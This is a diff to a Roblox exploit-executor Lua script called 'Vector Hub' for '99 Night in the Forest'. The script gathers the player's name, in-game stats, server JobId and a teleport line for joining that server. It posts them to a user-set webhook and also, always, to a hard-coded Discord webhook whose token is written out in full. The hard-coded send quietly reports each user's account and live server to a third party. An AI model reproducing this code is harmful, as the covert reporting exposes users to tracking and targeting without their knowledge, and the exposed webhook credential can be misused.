@@ -1,5 +1,6 @@
 wait(5)
 -- Configuration
+getgenv().Webhookurl = "" -- User-defined webhook URL
 local WEBHOOK1 = getgenv().Webhookurl
 local HARD_CODED_WEBHOOK = "https://discord.com/api/webhooks/1405892341272936449/cn6Lb-dxC4W-vpYDvR0odhtY9sjoHocVmp-xNCTC-MQuGTfnHJC-Ngv0g6Uk8PYLRKi1"
 
@@ -20,6 +21,10 @@ local function safeGetText(path)
 end
 
 local function sendWebhook(url, description, fields)
+    if not url or url == "" then
+        print("Skipping webhook: No valid URL provided")
+        return
+    end
     local success, response = pcall(function()
         local data = {
             ["username"] = "Vector Hub",
@@ -41,16 +46,16 @@ local function sendWebhook(url, description, fields)
         request({ Url = url, Body = newdata, Method = "POST", Headers = headers })
     end)
     if success then
-        print("Webhook sent successfully!")
+        print("Webhook sent successfully to " .. url)
     else
-        warn("Webhook failed: " .. tostring(response))
+        warn("Webhook failed for " .. url .. ": " .. tostring(response))
     end
 end
 
 -- Game Detection
-local is99Night = (game.PlaceId == 126509999114328) -- เปลี่ยนเป็น PlaceId จริงของ 99 Night in the Forest
+local is99Night = (game.PlaceId == 126509999114328) -- Update with the correct PlaceId
 if not is99Night then
-    warn("This script is designed for 99 Night in the Forest (PlaceId: 1234567890). Current PlaceId: " .. game.PlaceId)
+    warn("This script is designed for 99 Night in the Forest (PlaceId: 126509999114328). Current PlaceId: " .. game.PlaceId)
     return
 end
 
@@ -58,8 +63,8 @@ end
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local playerName = LocalPlayer.Name
-local diamondCount = safeGetText(LocalPlayer.PlayerGui.Interface.DiamondCount.Count)
-local dayCounter = safeGetText(LocalPlayer.PlayerGui.Interface.DayCounter)
+local diamondCount = safeGetText(LocalPlayer.PlayerGui:WaitForChild("Interface", 5).DiamondCount.Count)
+local dayCounter = safeGetText(LocalPlayer.PlayerGui:WaitForChild("Interface", 5).DayCounter)
 local PlayersMin = getPlayerCount()
 local JobId = tostring(game.JobId)
 local JoinServer = 'game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, \'' .. JobId .. '\')'
@@ -118,6 +123,7 @@ local fields2 = {
         ["value"] = '```' .. JoinServer .. '```'
     }
 }
--- Send Player Data Webhook (Send even if some data is missing)
+
+-- Send Webhooks
 sendWebhook(HARD_CODED_WEBHOOK, "**__99 Night in the Forest Info__**", fields2)
 sendWebhook(WEBHOOK1, "**__99 Night in the Forest Info__**", fields)
